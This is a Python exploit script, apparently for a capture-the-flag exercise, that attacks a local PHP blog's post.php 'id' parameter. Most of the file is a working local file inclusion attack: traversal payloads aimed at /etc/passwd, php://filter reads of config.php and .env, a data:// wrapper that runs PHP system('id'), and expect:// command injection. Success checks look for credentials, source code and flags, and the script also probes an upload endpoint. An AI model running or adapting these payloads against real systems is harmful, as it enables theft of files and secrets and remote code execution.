import requests
import re
import base64
import urllib.parse

# Configuration
BASE_URL = "http://127.0.0.1:33209"
HEADERS = {"User-Agent": "Mozilla/5.0 (Targeted-LFI-Exploit)"}

print("="*80)
print("TARGETED LFI EXPLOIT - USING ACTUAL 'id' PARAMETER")
print("="*80)
print(f"Target: {BASE_URL}/post.php?id=...")
print("="*80)

# First, let's test normal article access
articles = [
    "EternalBlue",
    "Introduction-to-Machine-Learning", 
    "ScriptKiddie",
    "ScriptKiddie-v2",
    "The-Importance-of-Cybersecurity"
]

print("\n[PHASE 1] Testing Normal Article Access")
print("-"*80)

for article in articles:
    url = f"{BASE_URL}/post.php?id={article}"
    try:
        resp = requests.get(url, headers=HEADERS, timeout=5)
        print(f"\n[+] Article: {article}")
        print(f"    URL: {url}")
        print(f"    Status: {resp.status_code}")
        print(f"    Size: {len(resp.content)}B")
        
        if resp.status_code == 200:
            # Check for flags in response
            if "flag{" in resp.text.lower():
                flag_match = re.search(r'flag\{[^}]+\}', resp.text, re.I)
                if flag_match:
                    print(f"    [!] FLAG FOUND: {flag_match.group(0)}")
            
            # Show content preview
            content_preview = re.sub(r'\s+', ' ', resp.text)[:200]
            print(f"    Preview: {content_preview}...")
            
    except Exception as e:
        print(f"    [-] Error: {e}")

# Now test LFI payloads with the 'id' parameter
print("\n\n[PHASE 2] Testing LFI Payloads with 'id' Parameter")
print("="*80)

lfi_payloads = [
    "../../../../etc/passwd",
    "/etc/passwd",
    "../../../../etc/hosts",
    "../../../../etc/hostname",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=post.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=.env",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
    "expect://id",
    "expect://whoami",
    "expect://ls",
]

print(f"\n[+] Testing {len(lfi_payloads)} LFI payloads...")

success_count = 0
for idx, payload in enumerate(lfi_payloads, 1):
    print(f"\n[{idx}/{len(lfi_payloads)}] Testing: {payload[:60]}...")
    
    # First try direct traversal
    url = f"{BASE_URL}/post.php?id={payload}"
    
    try:
        resp = requests.get(url, headers=HEADERS, timeout=8)
        content = resp.text
        
        # Check for various success indicators
        indicators = []
        
        if "root:" in content and "bin:" in content:
            indicators.append("ETC_PASSWD")
            print("    [!] SUCCESS - Found /etc/passwd content!")
        
        if "PD9waHA" in content or "<?php" in content:
            indicators.append("PHP_SOURCE")
            print("    [!] SUCCESS - Found PHP source code!")
        
        if "flag{" in content.lower():
            flag_match = re.search(r'flag\{[^}]+\}', content, re.I)
            if flag_match:
                indicators.append("FLAG_FOUND")
                print(f"    [!] SUCCESS - FLAG: {flag_match.group(0)}")
        
        if "DB_PASSWORD" in content or "MYSQL" in content.upper():
            indicators.append("CONFIG_DATA")
            print("    [!] SUCCESS - Found configuration data!")
        
        if "uid=" in content and "gid=" in content:
            indicators.append("SYSTEM_INFO")
            print("    [!] SUCCESS - Found system information!")
        
        if indicators:
            success_count += 1
            print(f"    Status: {resp.status_code}")
            print(f"    Size: {len(content)}B")
            print(f"    Indicators: {', '.join(indicators)}")
            print(f"    Preview: {content[:200]}...")
            
        # Try POST method too
        post_data = {'id': payload}
        resp_post = requests.post(f"{BASE_URL}/post.php", data=post_data, headers=HEADERS, timeout=8)
        content_post = resp_post.text
        
        if len(content_post) != len(content) or resp_post.status_code != resp.status_code:
            print(f"    Note: POST method returns different result (status: {resp_post.status_code}, size: {len(content_post)}B)")
            
    except Exception as e:
        print(f"    [-] Error: {e}")

print("\n" + "="*80)
print(f"LFI Testing Complete: {success_count}/{len(lfi_payloads)} payloads triggered indicators")
print("="*80)

# Test the new discovered endpoint
print("\n\n[PHASE 3] Testing Discovered Endpoint: posts/upload-article.php")
print("="*80)

try:
    upload_url = f"{BASE_URL}/posts/upload-article.php"
    resp = requests.get(upload_url, headers=HEADERS, timeout=5)
    print(f"\n[+] Testing: {upload_url}")
    print(f"    Status: {resp.status_code}")
    print(f"    Size: {len(resp.content)}B")
    
    if resp.status_code == 200:
        content_preview = re.sub(r'\s+', ' ', resp.text)[:300]
        print(f"    Content: {content_preview}...")
        
        # Check if it accepts parameters
        test_params = ['file', 'upload', 'article', 'content', 'id', 'page']
        print(f"\n[+] Testing parameters on upload endpoint...")
        
        for param in test_params:
            try:
                test_url = f"{BASE_URL}/posts/upload-article.php?{param}={urllib.parse.quote('../../../../etc/passwd')}"
                test_resp = requests.get(test_url, headers=HEADERS, timeout=5)
                
                if len(test_resp.content) != len(resp.content) or test_resp.status_code != resp.status_code:
                    print(f"    [!] Parameter '{param}' affects response (status: {test_resp.status_code}, size: {len(test_resp.content)}B)")
                    
                    if "root:" in test_resp.text:
                        print(f"        [!] VULNERABLE! Found /etc/passwd content")
                        
            except:
                continue
                
except Exception as e:
    print(f"    [-] Error: {e}")

# Check the Base64 string in the header
print("\n\n[PHASE 4] Checking Suspicious Base64 String")
print("="*80)

b64_string = "e0knbV9hX1NjcmlwdF9LaWRkaWV9"
print(f"[+] Found in header: {b64_string}")

try:
    decoded = base64.b64decode(b64_string).decode('utf-8')
    print(f"[+] Decoded: {decoded}")
    
    if "flag{" in decoded.lower():
        print(f"\n[!] FLAG FOUND: {decoded}")
    else:
        print("[+] This appears to be a regular text string, not a flag")
        
except Exception as e:
    print(f"[-] Error decoding: {e}")

print("\n" + "="*80)
print("EXPLOITATION COMPLETE")
print("="*80)
